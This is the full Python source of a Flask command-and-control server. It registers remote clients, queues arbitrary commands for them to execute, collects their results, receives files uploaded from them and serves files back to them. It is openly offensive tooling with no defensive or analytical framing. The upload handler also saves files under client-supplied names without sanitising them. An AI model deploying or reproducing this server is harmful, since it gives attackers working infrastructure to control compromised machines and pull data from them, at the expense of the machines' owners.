# c2_server.py - Ethan Zeevi
from flask import Flask, request, jsonify, send_from_directory
import os

app = Flask(__name__)

# Dictionary to store client UUIDs and commands
clients = {}

# Folder to store uploaded files
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

#Endpoint for clients to register to be able to be tracked dynamically
@app.route('/register_client', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    if client_id not in clients:
        clients[client_id] = ""  # Register new client with empty command
        print(f"Registered new client: {client_id}")
    return jsonify({'status': 'client registered', 'client_id': client_id})

@app.route('/clients', methods=['GET'])
def get_clients():
    # Return a list of registered clients
    return jsonify({'clients': list(clients.keys())})

# Endpoint for clients to retrieve command
@app.route('/command/<client_id>', methods=['GET'])
def get_command(client_id):
    command = clients.get(client_id, "")
    clients[client_id] = ""  # Clear command once retrieved
    return jsonify({'command': command})

# Sets command for client to execute
@app.route('/set_command/<client_id>', methods=['POST'])
def set_command(client_id):
    data = request.json
    command = data.get('command', '')
    if client_id in clients:
        clients[client_id] = command
        print(f"Command set for {client_id}: {command}")
        return jsonify({'status': 'command set'})
    else:
        return jsonify({'status': 'client not found'}), 404

@app.route('/result/<client_id>', methods=['POST'])
def receive_result(client_id):
    # Receive the command execution result from the client
    data = request.json
    print(f"Result from {client_id}: {data['result']}")
    return jsonify({'status': 'ok'})

# Uploads file from client to server
@app.route('/upload/<client_id>', methods=['POST'])
def upload_file(client_id):
    if 'file' not in request.files:
        return jsonify({'status': 'no file part'})

    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'no selected file'})

    filepath = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(filepath)
    print(f"File {file.filename} uploaded from {client_id}")
    return jsonify({'status': 'file uploaded'})

# Sends file to client to download
@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

